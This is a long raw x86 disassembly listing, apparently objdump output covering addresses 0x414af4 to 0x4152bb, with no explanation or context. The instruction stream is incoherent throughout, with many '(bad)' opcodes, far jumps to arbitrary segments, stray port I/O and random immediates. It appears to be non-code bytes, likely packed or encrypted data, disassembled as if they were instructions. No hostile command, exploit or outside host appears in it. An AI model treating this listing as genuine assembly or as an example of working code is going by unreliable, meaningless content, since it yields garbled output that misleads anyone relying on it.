  414af4:	xchg   DWORD PTR [eax],esp
  414af6:	repnz loopne 0x414b17
  414af9:	push   ecx
  414afa:	sbb    eax,0xdf3ff895
  414aff:	cmp    cl,dl
  414b01:	loope  0x414b7c
  414b03:	push   esp
  414b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b05:	test   ecx,edx
  414b07:	inc    ebp
  414b08:	sahf   
  414b09:	push   es
  414b0a:	mov    bl,0x86
  414b0c:	cmp    al,0x1a
  414b0e:	xchg   DWORD PTR [edi],edi
  414b10:	fwait
  414b11:	cdq    
  414b12:	sbb    esi,edx
  414b14:	sbb    al,0xbe
  414b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b17:	mov    edx,0xe94032b
  414b1c:	lods   eax,DWORD PTR ds:[esi]
  414b1d:	sbb    al,0xaa
  414b1f:	sub    BYTE PTR [eax+0x5334eb24],ch
  414b25:	add    BYTE PTR [eax],cl
  414b27:	cmp    esp,DWORD PTR [edi-0x1b72f9f4]
  414b2d:	mov    ebx,eax
  414b2f:	mov    edx,0x75048895
  414b34:	data16 in al,dx
  414b36:	pop    edx
  414b37:	push   eax
  414b38:	and    BYTE PTR [edi-0x18],0xc0
  414b3c:	sub    ch,dl
  414b3e:	inc    esi
  414b3f:	les    esp,FWORD PTR cs:[ebx+0x1f4e6a4b]
  414b46:	repz rcl edi,0x8b
  414b4a:	retf   
  414b4b:	popf   
  414b4c:	sar    DWORD PTR [ebp+0x951f67b],1
  414b52:	jno    0x414bb7
  414b54:	fstp   QWORD PTR [esi+0x61fe48c0]
  414b5a:	xor    al,0x1f
  414b5c:	dec    esp
  414b5d:	dec    ecx
  414b5e:	mov    bl,0xf6
  414b60:	push   eax
  414b61:	cmc    
  414b62:	mov    eax,0xcd5324df
  414b67:	mov    dl,0xb3
  414b69:	mov    bh,0x18
  414b6b:	adc    ebp,edx
  414b6d:	mov    eax,ds:0x68180d45
  414b72:	int    0x8b
  414b74:	cmp    eax,0xe2e295b8
  414b79:	push   ebp
  414b7a:	arpl   WORD PTR [ecx+0x1a],cx
  414b7d:	jnp    0x414b15
  414b7f:	bound  edi,QWORD PTR [edi]
  414b81:	into   
  414b82:	in     eax,dx
  414b83:	cmp    BYTE PTR [edx],ch
  414b85:	scas   al,BYTE PTR es:[edi]
  414b86:	sub    al,0x6
  414b88:	hlt    
  414b89:	(bad)  
  414b8b:	or     esp,DWORD PTR [edx]
  414b8d:	sub    esp,DWORD PTR [esi]
  414b8f:	cvtdq2ps xmm7,XMMWORD PTR [edx-0x3e]
  414b93:	enter  0x282b,0xca
  414b97:	fs in  al,dx
  414b99:	push   ebx
  414b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b9b:	jbe    0x414b69
  414b9d:	test   DWORD PTR [eax-0x71ce37fd],edx
  414ba3:	jns    0x414b73
  414ba5:	ds pop es
  414ba7:	leave  
  414ba8:	scas   eax,DWORD PTR es:[edi]
  414ba9:	(bad)  
  414baa:	lock in al,dx
  414bac:	ret    
  414bad:	mov    ch,0x3a
  414baf:	cmp    ebp,ebx
  414bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb2:	test   BYTE PTR [ebp+0x1000045a],bh
  414bb8:	jl     0x414c2c
  414bba:	mov    ds:0x5e7b0bb6,eax
  414bbf:	add    al,0xe3
  414bc1:	pop    esp
  414bc2:	jno    0x414baa
  414bc4:	mov    ch,0x5d
  414bc6:	inc    eax
  414bc7:	stc    
  414bc8:	neg    DWORD PTR [ebx]
  414bca:	(bad)  
  414bcb:	loope  0x414c42
  414bcd:	call   0x688d:0xafbe9944
  414bd4:	(bad)  
  414bd6:	fcomp  DWORD PTR [esi+0x25602fd6]
  414bdc:	repz push esp
  414bde:	je     0x414b88
  414be0:	test   DWORD PTR [esi-0xa],ecx
  414be3:	mov    ch,0xce
  414be5:	xchg   ebx,eax
  414be6:	js     0x414c52
  414be8:	rol    BYTE PTR [edi],cl
  414bea:	pop    esi
  414beb:	(bad)  
  414bec:	or     eax,0x3ada8ee
  414bf1:	ret    
  414bf2:	cld    
  414bf3:	sti    
  414bf4:	imul   ebp,DWORD PTR [edx],0xffffffdb
  414bf7:	scas   al,BYTE PTR es:[edi]
  414bf8:	inc    BYTE PTR [esi+0x2c]
  414bfb:	imul   ebp,esi,0x50
  414bfe:	fs aad 0x15
  414c01:	dec    ebp
  414c02:	jmp    0xe7ab:0xe444143d
  414c09:	or     eax,0xd4f26170
  414c0e:	sbb    al,0xbb
  414c10:	call   0xbdd64551
  414c15:	pop    ebp
  414c16:	xor    dh,BYTE PTR [esi]
  414c18:	or     eax,0x651aa3f0
  414c1d:	out    dx,al
  414c1e:	mov    ah,0xd4
  414c20:	test   bh,0x49
  414c23:	mov    ah,0x77
  414c25:	sub    al,0xea
  414c27:	stc    
  414c28:	nop
  414c29:	retf   
  414c2a:	jmp    0x414c69
  414c2c:	fstp   TBYTE PTR [bp+si+0x15]
  414c30:	or     al,0xf5
  414c32:	inc    eax
  414c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c34:	gs xchg edx,esp
  414c37:	ins    BYTE PTR es:[edi],dx
  414c38:	arpl   WORD PTR [edx+ebx*4],di
  414c3b:	mov    DWORD PTR [edx],esi
  414c3d:	test   eax,0x404e079
  414c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c43:	mov    ds:0x93759e8e,al
  414c48:	shr    BYTE PTR [edi-0x4],1
  414c4b:	sub    BYTE PTR [esi],0x6e
  414c4e:	(bad)  
  414c4f:	sahf   
  414c50:	dec    ecx
  414c51:	adc    cl,cl
  414c53:	xor    ah,BYTE PTR [edx+esi*4]
  414c56:	or     esi,DWORD PTR [ebx+0x67d363c6]
  414c5c:	pop    ebx
  414c5d:	loop   0x414c34
  414c5f:	mov    dh,0x24
  414c61:	push   eax
  414c62:	or     al,0x5a
  414c64:	inc    edi
  414c65:	scas   eax,DWORD PTR es:[edi]
  414c66:	fidiv  WORD PTR [eax-0x4b]
  414c69:	jo     0x414c74
  414c6b:	jno    0x414bf9
  414c6d:	xchg   ecx,eax
  414c6e:	push   0xf88c7034
  414c73:	lods   eax,DWORD PTR ds:[esi]
  414c74:	inc    edi
  414c75:	mov    al,0x46
  414c77:	add    DWORD PTR [edi-0x23],ebp
  414c7a:	retf   0x3f47
  414c7d:	mov    esp,0xfb48ba41
  414c82:	retf   0xe763
  414c85:	mov    edi,0x77bcaed
  414c8a:	loopne 0x414ccd
  414c8c:	cli    
  414c8d:	int3   
  414c8e:	call   0x9aea7df
  414c93:	ret    0x4475
  414c96:	fild   WORD PTR [ecx+eiz*8-0x6]
  414c9a:	mov    DWORD PTR [ebp-0x3e],ecx
  414c9d:	in     eax,dx
  414c9e:	xchg   esi,eax
  414c9f:	push   ss
  414ca0:	aaa    
  414ca1:	mov    ebp,0x6bd24b38
  414ca6:	sub    eax,0x4a012c20
  414cab:	dec    edi
  414cac:	rol    DWORD PTR [edi],cl
  414cae:	xor    ah,al
  414cb0:	mov    ebx,0x2b95cf67
  414cb5:	jl     0x414c72
  414cb7:	cdq    
  414cb8:	test   eax,0xfd214125
  414cbd:	xor    DWORD PTR [edx+0x75],ebp
  414cc0:	adc    eax,0xf37479fd
  414cc5:	push   eax
  414cc6:	pop    ds
  414cc7:	add    ecx,eax
  414cc9:	mov    edx,DWORD PTR [edi-0x39a81664]
  414ccf:	adc    bl,BYTE PTR [edi-0x78]
  414cd2:	test   BYTE PTR [edx],al
  414cd4:	pop    esp
  414cd5:	stc    
  414cd6:	aaa    
  414cd7:	xlat   BYTE PTR ds:[ebx]
  414cd8:	inc    ebx
  414cd9:	cli    
  414cda:	push   ebx
  414cdb:	in     al,0x5f
  414cdd:	mov    dl,0x6
  414cdf:	retf   0x641d
  414ce2:	ret    0x4b80
  414ce5:	int    0xe7
  414ce7:	add    eax,0xa2ac46a1
  414cec:	xchg   esp,eax
  414ced:	out    dx,eax
  414cee:	icebp  
  414cef:	pop    ebp
  414cf0:	mov    esi,0x5d2c4e4e
  414cf5:	(bad)  
  414cf6:	adc    al,0x95
  414cf8:	cmp    eax,0xd2056f97
  414cfd:	das    
  414cfe:	mov    edi,0xdd07407b
  414d03:	mov    bh,0xba
  414d05:	pop    ebx
  414d06:	in     al,0xc7
  414d08:	dec    esi
  414d09:	leave  
  414d0a:	mov    bl,0x43
  414d0c:	add    ebp,DWORD PTR [eax-0x5cdd6ddc]
  414d12:	sti    
  414d13:	or     bh,0x67
  414d16:	icebp  
  414d17:	dec    edi
  414d18:	mov    al,0x73
  414d1a:	rol    dl,1
  414d1c:	scas   eax,DWORD PTR es:[edi]
  414d1d:	push   ds
  414d1e:	les    ecx,FWORD PTR [esi]
  414d20:	ret    
  414d21:	fiadd  DWORD PTR [ebx+0x279ba12c]
  414d27:	adc    eax,0xc72617a8
  414d2c:	arpl   si,di
  414d2e:	xchg   edx,eax
  414d2f:	aas    
  414d30:	arpl   WORD PTR [ebx+0x42],bp
  414d33:	retf   
  414d34:	pushf  
  414d35:	and    al,0x48
  414d37:	adc    al,BYTE PTR ds:0xac1c0e3c
  414d3d:	sub    DWORD PTR [edx+0x75],0xea9bf2d8
  414d44:	push   0x8d7a18b6
  414d49:	ret    
  414d4a:	call   0x8d2a4eac
  414d4f:	add    al,0xe6
  414d51:	repz push edx
  414d53:	les    eax,FWORD PTR [ebp+0x32]
  414d56:	call   FWORD PTR [ecx+0x4b]
  414d59:	mov    ah,0x72
  414d5b:	inc    esi
  414d5c:	dec    esi
  414d5d:	xchg   ebx,eax
  414d5e:	(bad)  
  414d60:	mov    ds:0x6c2d92e1,eax
  414d65:	mov    edx,0x92e45301
  414d6a:	sbb    DWORD PTR [edi+0x1e],edi
  414d6d:	repz int3 
  414d6f:	mov    dh,0xba
  414d71:	shl    DWORD PTR [eax+0x52],cl
  414d74:	cli    
  414d75:	push   ebp
  414d76:	push   cs
  414d77:	lahf   
  414d78:	out    dx,eax
  414d79:	mov    esi,0x7f87534f
  414d7e:	push   esp
  414d7f:	adc    eax,0x7a8a0028
  414d84:	pop    esi
  414d85:	sub    esi,DWORD PTR [edx-0x209f8a6d]
  414d8b:	xlat   BYTE PTR ds:[ebx]
  414d8c:	jle    0x414d98
  414d8e:	cwde   
  414d8f:	xchg   ebx,eax
  414d90:	mov    eax,0xfb40d2c8
  414d95:	cmp    BYTE PTR [edx+0xdd7388c],0xc4
  414d9c:	push   0x74
  414d9e:	dec    esi
  414d9f:	repz (bad) 
  414da1:	cld    
  414da2:	out    0xfd,al
  414da4:	inc    ebx
  414da5:	and    eax,0x483a1ea4
  414daa:	mov    bh,0x25
  414dac:	xor    edi,DWORD PTR [ebp+0x5]
  414daf:	dec    esi
  414db0:	xor    al,0x30
  414db2:	lods   al,BYTE PTR ds:[esi]
  414db3:	out    0x95,al
  414db5:	push   ebp
  414db6:	xchg   ebp,eax
  414db7:	lods   al,BYTE PTR ds:[esi]
  414db8:	in     eax,dx
  414db9:	adc    eax,0x9887aef
  414dbe:	xchg   DWORD PTR [eax-0x33],esp
  414dc1:	ror    DWORD PTR [edi+ebx*4-0x5be310b6],1
  414dc8:	sub    edi,esi
  414dca:	pop    ebx
  414dcb:	shr    DWORD PTR [ebx],0x6a
  414dce:	ins    DWORD PTR es:[edi],dx
  414dcf:	pushf  
  414dd0:	ins    DWORD PTR es:[edi],dx
  414dd1:	adc    eax,0xed118f60
  414dd6:	and    ecx,DWORD PTR [esi+0x28cc4df3]
  414ddc:	dec    ebp
  414ddd:	mov    WORD PTR [esi-0x3794a375],?
  414de3:	div    BYTE PTR ds:0x9a2246f5
  414de9:	test   ah,ch
  414deb:	and    eax,0x83070b1d
  414df0:	ret    0x438
  414df3:	jmp    0x923bed17
  414df8:	sti    
  414df9:	out    dx,al
  414dfa:	mov    ebx,0x89095b1b
  414dff:	xchg   esp,eax
  414e00:	push   esi
  414e01:	jne    0x414e00
  414e03:	xchg   DWORD PTR [ebx-0x35e9e302],esi
  414e09:	nop
  414e0a:	sbb    eax,0xd4327efd
  414e0f:	dec    edi
  414e10:	test   eax,0x7a3f1174
  414e15:	jnp    0x414e2e
  414e17:	cmp    al,0x47
  414e19:	imul   edi,DWORD PTR [edx],0x6c9c788d
  414e1f:	mov    ebx,DWORD PTR [esi+0x48]
  414e22:	pop    esp
  414e23:	push   ds
  414e24:	pop    eax
  414e25:	mov    ebp,0x120c5a8c
  414e2a:	xchg   edx,eax
  414e2b:	cmp    cl,BYTE PTR [ebx]
  414e2d:	xchg   BYTE PTR [ebx+eax*4-0x2d],bl
  414e31:	jg     0x414e08
  414e33:	inc    edx
  414e34:	xchg   ecx,ebx
  414e36:	jp     0x414eb1
  414e38:	cwde   
  414e39:	and    eax,0x6f50f65b
  414e3e:	xor    al,0x4a
  414e40:	das    
  414e41:	(bad)  
  414e42:	out    dx,al
  414e43:	and    eax,0xd91b1ab6
  414e48:	iret   
  414e49:	mov    esp,DWORD PTR [eax+0x20303fa3]
  414e4f:	add    BYTE PTR [ecx-0x7c5ed964],cl
  414e55:	and    esp,DWORD PTR [ecx+ebp*1]
  414e58:	adc    eax,DWORD PTR [eax-0x2d]
  414e5b:	lock push ss
  414e5d:	mov    al,ds:0xf34c6457
  414e62:	sbb    al,ah
  414e64:	xchg   edi,eax
  414e65:	jb     0x414ec9
  414e67:	sub    DWORD PTR [ecx+0x5eab4957],ecx
  414e6d:	fild   DWORD PTR [esi-0x68]
  414e70:	inc    ebp
  414e71:	in     eax,dx
  414e72:	in     eax,0xa2
  414e74:	fwait
  414e75:	pop    ebp
  414e76:	adc    bl,BYTE PTR [ecx]
  414e78:	cmc    
  414e79:	or     al,0xd9
  414e7b:	jbe    0x414e8d
  414e7d:	in     al,0xc5
  414e7f:	aaa    
  414e80:	mov    bh,0x79
  414e82:	mov    esi,0x673a7d47
  414e87:	lods   al,BYTE PTR ds:[esi]
  414e88:	and    al,bh
  414e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e8b:	push   ebp
  414e8c:	inc    eax
  414e8d:	out    dx,eax
  414e8e:	and    edx,DWORD PTR [edx-0x7d]
  414e91:	mov    esi,0xe592c5c2
  414e96:	(bad)  
  414e97:	push   ss
  414e98:	in     eax,0xea
  414e9a:	aam    0xbb
  414e9c:	xor    DWORD PTR [eax-0x7afe0460],edx
  414ea2:	loope  0x414ece
  414ea4:	xchg   edx,eax
  414ea5:	push   0xffffffa1
  414ea7:	mov    bh,0x86
  414ea9:	sub    al,0xc0
  414eab:	sub    esi,DWORD PTR [edx]
  414ead:	or     al,BYTE PTR [eax-0x6c]
  414eb0:	push   0xffffffde
  414eb2:	or     BYTE PTR [ebx],bl
  414eb4:	inc    ebp
  414eb5:	ficomp DWORD PTR [esi-0x35529146]
  414ebb:	loope  0x414ecf
  414ebd:	and    al,0xcb
  414ebf:	int3   
  414ec0:	push   0x9a50eb5d
  414ec5:	push   ebp
  414ec6:	imul   esi,DWORD PTR [eax],0xffffffce
  414ec9:	test   BYTE PTR [esi],bl
  414ecb:	or     DWORD PTR [ecx],0x2c
  414ece:	shl    DWORD PTR [ecx+eax*1-0x48],0x3d
  414ed3:	jae    0x414ee2
  414ed5:	and    eax,0x7e13cff9
  414eda:	mov    bh,BYTE PTR [esi+ebp*4-0x14]
  414ede:	ror    BYTE PTR [edx],0x8a
  414ee1:	mov    bh,0x12
  414ee3:	aam    0xae
  414ee5:	addr16 xchg esi,eax
  414ee7:	aad    0x74
  414ee9:	icebp  
  414eea:	cmp    ebx,0xffffff8d
  414eed:	mov    eax,ds:0x5a1d0819
  414ef2:	or     esp,ebx
  414ef4:	shl    DWORD PTR [ecx-0x41e68c6c],0xbf
  414efb:	in     eax,dx
  414efc:	inc    edi
  414efd:	mov    dh,0x92
  414eff:	mov    bh,0x2b
  414f01:	leave  
  414f02:	mov    esp,DWORD PTR [ebx]
  414f04:	mov    dh,0x60
  414f06:	stos   DWORD PTR es:[edi],eax
  414f07:	ja     0x414f24
  414f09:	(bad)  
  414f0a:	push   eax
  414f0b:	aaa    
  414f0c:	sbb    dh,bl
  414f0e:	jb     0x414f38
  414f10:	aaa    
  414f11:	cdq    
  414f12:	call   0xd971:0xbdbc6543
  414f19:	or     ecx,DWORD PTR [edx+0x2]
  414f1c:	ss mov bl,0xe1
  414f1f:	hlt    
  414f20:	(bad)  
  414f22:	jmp    0x414f34
  414f24:	jae    0x414f23
  414f26:	cmp    edx,DWORD PTR [ecx-0x7227fcf4]
  414f2c:	ss iret 
  414f2e:	(bad)  
  414f2f:	aaa    
  414f30:	mov    dh,0x17
  414f32:	shl    DWORD PTR [ebx-0x60],0xc
  414f36:	std    
  414f37:	mov    eax,0xf9fac97f
  414f3c:	dec    ebx
  414f3d:	pop    esi
  414f3e:	adc    esi,DWORD PTR [esi+edx*1-0x54de7ec2]
  414f45:	inc    edx
  414f46:	ficom  DWORD PTR [ecx]
  414f48:	cs test bh,bh
  414f4b:	or     esp,DWORD PTR [edi-0x5de13316]
  414f51:	test   DWORD PTR ds:0x8ba156ce,eax
  414f57:	add    eax,0x7d64288a
  414f5c:	sbb    al,0xc
  414f5e:	pop    ds
  414f5f:	xchg   edx,eax
  414f60:	ret    0xabb7
  414f63:	sbb    al,0xc7
  414f65:	loope  0x414efe
  414f67:	neg    BYTE PTR [esi-0x26]
  414f6a:	(bad)  
  414f6b:	lock cld 
  414f6d:	or     BYTE PTR [eax+0x7f7ba75d],al
  414f73:	out    0x9b,eax
  414f75:	push   ebx
  414f76:	neg    DWORD PTR [eax]
  414f78:	repnz daa 
  414f7a:	out    dx,al
  414f7b:	out    dx,eax
  414f7c:	mov    eax,ds:0x9f8a5c1d
  414f81:	jg     0x414f6b
  414f83:	mov    ss,WORD PTR [esi+0x17382968]
  414f89:	ret    
  414f8a:	jg     0x414fa2
  414f8c:	sub    BYTE PTR [ebx-0x5a],bh
  414f8f:	sub    ch,cl
  414f91:	xchg   ecx,eax
  414f92:	mov    ecx,esi
  414f94:	xchg   edx,eax
  414f95:	jge    0x414f64
  414f97:	rcl    DWORD PTR [edi],1
  414f99:	outs   dx,DWORD PTR ds:[esi]
  414f9a:	jb     0x414f27
  414f9c:	jl     0x414f87
  414f9e:	adc    DWORD PTR [edx],ecx
  414fa0:	mov    dl,0x4
  414fa2:	retf   0x5f90
  414fa5:	mov    WORD PTR [ebx+0x56aabe19],?
  414fab:	fwait
  414fac:	(bad)  
  414fad:	imul   ebx,DWORD PTR [edi+0xa],0x3e
  414fb1:	and    dl,BYTE PTR [edx+edx*8-0x5ddfcd23]
  414fb8:	mov    esp,0x11b9345e
  414fbd:	daa    
  414fbe:	scas   al,BYTE PTR es:[edi]
  414fbf:	adc    ebp,edx
  414fc1:	(bad)  
  414fc2:	shl    BYTE PTR [esi],1
  414fc4:	and    ah,BYTE PTR [esi+0x2e2d7daf]
  414fca:	outs   dx,BYTE PTR ds:[esi]
  414fcb:	push   edx
  414fcc:	sub    ah,BYTE PTR [edi+0x63]
  414fcf:	fs js  0x414fce
  414fd2:	fiadd  WORD PTR [ebx]
  414fd4:	or     DWORD PTR [ebx-0x8],ecx
  414fd7:	cli    
  414fd8:	push   0x276d0031
  414fdd:	jnp    0x414ff2
  414fdf:	outs   dx,BYTE PTR ds:[esi]
  414fe0:	arpl   WORD PTR [esi-0x1cbc80ed],cx
  414fe6:	dec    eax
  414fe7:	data16 in al,0xb
  414fea:	ins    DWORD PTR es:[edi],dx
  414feb:	ins    DWORD PTR es:[edi],dx
  414fec:	mov    BYTE PTR [eax-0x41ac38da],dl
  414ff2:	in     al,0x61
  414ff4:	inc    eax
  414ff5:	ins    DWORD PTR es:[edi],dx
  414ff6:	(bad)  
  414ff7:	pop    ebx
  414ff8:	sbb    eax,DWORD PTR [ebx-0x7]
  414ffb:	fld    QWORD PTR [ecx]
  414ffd:	mov    WORD PTR [edx-0x51982269],ss
  415003:	repnz push ss
  415005:	dec    esp
  415006:	xchg   edi,eax
  415007:	test   esi,ecx
  415009:	dec    eax
  41500a:	test   DWORD PTR [edx+0x31bd9df7],ebp
  415010:	out    dx,al
  415011:	shl    BYTE PTR [ebx+ebp*8-0x3],cl
  415015:	popa   
  415016:	mov    eax,0x12527cd3
  41501b:	sub    al,cl
  41501d:	dec    edx
  41501e:	cmp    ch,BYTE PTR [eax+0x18]
  415021:	push   ds
  415022:	fcomp  st(2)
  415024:	js     0x415084
  415026:	gs data16 (bad) 
  415029:	in     eax,dx
  41502a:	xor    al,0x61
  41502c:	dec    esp
  41502d:	iret   
  41502e:	add    edi,DWORD PTR [ebx-0x39]
  415031:	xchg   ecx,eax
  415032:	outs   dx,BYTE PTR ds:[esi]
  415033:	pusha  
  415034:	mov    bl,al
  415036:	jmp    0xc353:0xcfeb3d26
  41503d:	xchg   ebx,eax
  41503e:	cmp    eax,0x67472ceb
  415043:	aaa    
  415044:	nop
  415045:	mov    cl,0xe
  415047:	push   ecx
  415048:	lods   eax,DWORD PTR ds:[esi]
  415049:	jno    0x414ffe
  41504b:	aam    0xd8
  41504d:	in     eax,0x1e
  41504f:	and    DWORD PTR [ecx-0x135e3178],ebp
  415055:	sub    ebp,ebp
  415057:	pusha  
  415058:	inc    edi
  415059:	pop    edi
  41505a:	mov    dh,0xa4
  41505c:	adc    eax,0x8d54238e
  415061:	sbb    al,0x2a
  415063:	dec    ebx
  415064:	or     al,0x4
  415066:	mov    eax,ds:0xb49c2949
  41506b:	pusha  
  41506c:	mov    ch,BYTE PTR [ecx+eax*2+0x7205476]
  415073:	popa   
  415074:	and    DWORD PTR [ecx],edi
  415076:	(bad)  
  415077:	sar    DWORD PTR [ecx-0x7849e9],0x59
  41507e:	enter  0x3d91,0xd4
  415082:	sbb    eax,0x9812e965
  415087:	jle    0x4150bd
  415089:	jo     0x41505a
  41508b:	adc    eax,DWORD PTR [ecx+0x75a0eaaa]
  415091:	repnz (bad) 
  415093:	push   edx
  415094:	cmp    al,0x2c
  415096:	sbb    ebp,DWORD PTR [eax]
  415098:	jmp    0x3adf:0xca0eb38e
  41509f:	xlat   BYTE PTR ds:[ebx]
  4150a0:	jl     0x41507e
  4150a2:	sbb    ecx,esp
  4150a4:	pop    eax
  4150a5:	mov    ch,0x70
  4150a7:	in     al,dx
  4150a8:	out    dx,eax
  4150a9:	mov    ah,BYTE PTR [esi]
  4150ab:	lahf   
  4150ac:	cs pusha 
  4150ae:	bswap  ecx
  4150b0:	repz cmp DWORD PTR [ebp-0x6a1903e2],ebp
  4150b7:	cmp    ebx,DWORD PTR [edx+eax*8+0x369866e5]
  4150be:	rol    BYTE PTR [edi+0x34],0x7a
  4150c2:	(bad)  
  4150c6:	repnz mov ds:0x13688bfb,al
  4150cc:	mov    dl,0x3e
  4150ce:	mov    bh,0xa2
  4150d0:	jnp    0x415145
  4150d2:	inc    ebp
  4150d3:	je     0x41506f
  4150d5:	xchg   edi,eax
  4150d6:	mov    dl,0x54
  4150d8:	push   0x3e
  4150da:	mov    ch,0x56
  4150dc:	sub    BYTE PTR [ecx-0x62],al
  4150df:	jne    0x415064
  4150e1:	fs lahf 
  4150e3:	mov    ?,WORD PTR [edx]
  4150e5:	xor    ecx,DWORD PTR [edx-0x43]
  4150e8:	sub    eax,0x44e59ff6
  4150ed:	xor    eax,DWORD PTR [edi-0xbe0733d]
  4150f3:	mov    esp,?
  4150f5:	mov    cl,0x73
  4150f7:	inc    esp
  4150f8:	add    eax,0xf13dd585
  4150fd:	push   0x3e
  4150ff:	mov    esi,0x662fc57f
  415104:	push   esi
  415105:	dec    ebp
  415106:	retf   0x4bab
  415109:	xor    BYTE PTR [eax+edx*4+0x45],ch
  41510d:	arpl   sp,di
  41510f:	mov    ds:0xe27c3983,al
  415114:	sbb    al,0x6b
  415116:	out    0x89,al
  415118:	and    DWORD PTR [edi-0xa],ebp
  41511b:	fisttp DWORD PTR [ecx-0xc]
  41511e:	data16 and bh,BYTE PTR [edx-0x49]
  415122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415123:	ins    BYTE PTR es:[edi],dx
  415124:	inc    eax
  415125:	push   eax
  415126:	mov    ebp,0x2b63ec57
  41512b:	cmp    edx,ebp
  41512d:	adc    cl,BYTE PTR [edx-0x61ded646]
  415133:	repz dec edi
  415135:	sbb    DWORD PTR [ebp+esi*2-0x1ccb8b6c],ebx
  41513c:	push   eax
  41513d:	sub    al,0x24
  41513f:	retf   0x939e
  415142:	sbb    eax,0x5f3f035a
  415147:	imul   eax,DWORD PTR [ebp+0x39],0xffffffaf
  41514b:	pop    esp
  41514c:	in     al,dx
  41514d:	cmp    BYTE PTR [ecx+0x5935fb2e],0x85
  415154:	fcomp  st(6)
  415156:	pop    es
  415157:	mov    gs,WORD PTR [ebx]
  415159:	sbb    BYTE PTR [esi],cl
  41515b:	mov    edi,0xfad502c9
  415160:	sbb    al,0x70
  415162:	sub    al,0x28
  415164:	(bad)  
  415165:	mov    bl,0xda
  415167:	loop   0x4151de
  415169:	push   0x37494326
  41516e:	daa    
  41516f:	(bad)  
  415170:	test   BYTE PTR [edi-0x7f67f613],ah
  415176:	push   cs
  415177:	hlt    
  415178:	shl    BYTE PTR [edx],1
  41517a:	ret    0x95b8
  41517d:	add    al,0x8c
  41517f:	mov    bh,0xc0
  415181:	(bad)  
  415182:	and    ch,BYTE PTR ds:0x3512d583
  415188:	scas   eax,DWORD PTR es:[edi]
  415189:	mov    ch,0x41
  41518b:	mov    eax,ds:0xfe57c82f
  415190:	sbb    esi,DWORD PTR [ecx+eax*2-0x6e]
  415194:	(bad)  
  415195:	iret   
  415196:	imul   edx,DWORD PTR [ebx+0x472220e1],0x89206c53
  4151a0:	mov    ch,dl
  4151a2:	movntq (bad),mm2
  4151a3:	out    0xd7,eax
  4151a5:	jp     0x415137
  4151a7:	mov    ebp,0xfa6524df
  4151ac:	(bad)  
  4151ad:	out    0x6b,al
  4151af:	ror    esp,cl
  4151b1:	push   edx
  4151b2:	sahf   
  4151b3:	mov    al,0x84
  4151b5:	xchg   BYTE PTR [eax+0x17],ch
  4151b8:	jp     0x41515e
  4151ba:	mov    edi,0x3dadaefa
  4151bf:	sar    BYTE PTR [eax],1
  4151c1:	jmp    0xedc9:0x399c97e0
  4151c8:	xchg   ebp,eax
  4151c9:	fstp   QWORD PTR [ebx-0x69b380d6]
  4151cf:	adc    DWORD PTR [edi-0x27dbed45],eax
  4151d5:	std    
  4151d6:	jbe    0x4151af
  4151d8:	mov    eax,0xe9eea390
  4151dd:	push   edx
  4151de:	push   ecx
  4151df:	inc    eax
  4151e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151e1:	mov    ebp,0xd6ed2123
  4151e6:	and    al,0xaf
  4151e8:	pop    es
  4151e9:	ins    DWORD PTR es:[edi],dx
  4151ea:	xlat   BYTE PTR ds:[ebx]
  4151eb:	iret   
  4151ec:	cmp    cl,0xcc
  4151ef:	pushf  
  4151f0:	data16 jo 0x41522b
  4151f3:	mov    esp,0xbc8f89f2
  4151f8:	dec    eax
  4151f9:	xchg   esp,eax
  4151fa:	popf   
  4151fb:	mov    al,ds:0xf7ba14e2
  415200:	(bad)  
  415201:	push   edi
  415202:	sub    edi,DWORD PTR [ebx]
  415204:	cs test al,0xba
  415207:	retf   
  415208:	cmp    ah,ah
  41520a:	add    eax,0x3dfc790
  41520f:	jle    0x415221
  415211:	fisubr WORD PTR [ebx-0x19583112]
  415217:	push   ebp
  415218:	fs or  ah,bh
  41521b:	and    BYTE PTR gs:[ebx+0x5a],ah
  41521f:	mov    dh,0xba
  415221:	(bad)  
  415223:	jo     0x415267
  415225:	fstp   st(1)
  415227:	mov    eax,ds:0x433a034b
  41522c:	push   0x661ea5cf
  415231:	adc    DWORD PTR [ebp+0x14],esp
  415234:	call   0xb0c81059
  415239:	sub    eax,DWORD PTR [ecx+0x446479ea]
  41523f:	mov    dh,0xf4
  415241:	aas    
  415242:	lds    eax,FWORD PTR ds:0x89eaa251
  415248:	nop
  415249:	mov    cl,0x76
  41524b:	in     eax,0x37
  41524d:	jge    0x4151f5
  41524f:	pop    es
  415250:	inc    ecx
  415251:	outs   dx,BYTE PTR ds:[esi]
  415252:	fst    DWORD PTR [edi+0x1859219a]
  415258:	pop    esp
  415259:	mov    eax,0x2ae1c7f1
  41525e:	mov    bl,0x34
  415260:	(bad)  
  415261:	rol    BYTE PTR [edi+0x71dac005],1
  415267:	addr16 int3 
  415269:	out    0x31,eax
  41526b:	add    al,0x0
  41526d:	xchg   esp,eax
  41526e:	aam    0x1b
  415270:	mov    edi,0x49de93ca
  415275:	mov    eax,ds:0x799fff3d
  41527a:	loop   0x4152ca
  41527c:	and    DWORD PTR [edi-0x7f],0x6a
  415280:	jle    0x4152b4
  415282:	outs   dx,DWORD PTR ds:[esi]
  415284:	(bad)  
  415285:	retf   0xbec7
  415288:	mov    dl,0x6e
  41528a:	or     bl,ch
  41528c:	in     eax,dx
  41528d:	div    BYTE PTR [eax]
  41528f:	cmp    edi,edi
  415291:	fisub  DWORD PTR [eax+ebx*2+0x589cc0ec]
  415298:	pop    ecx
  415299:	bound  ebp,QWORD PTR [eax-0x62]
  41529c:	xchg   edx,eax
  41529d:	test   eax,0xbdeeab45
  4152a2:	fstp   QWORD PTR [ecx-0x3a]
  4152a5:	int    0xc2
  4152a7:	scas   al,BYTE PTR es:[edi]
  4152a8:	mov    ah,0xaf
  4152aa:	mov    DWORD PTR cs:[ebp-0x78],eax
  4152ae:	push   edx
  4152af:	sbb    ch,ah
  4152b1:	icebp  
  4152b2:	adc    BYTE PTR [ebx+esi*4+0x62],dl
  4152b6:	add    al,0xcb
  4152b8:	adc    bl,ch
  4152ba:	iret   
  4152bb:	pop    ds
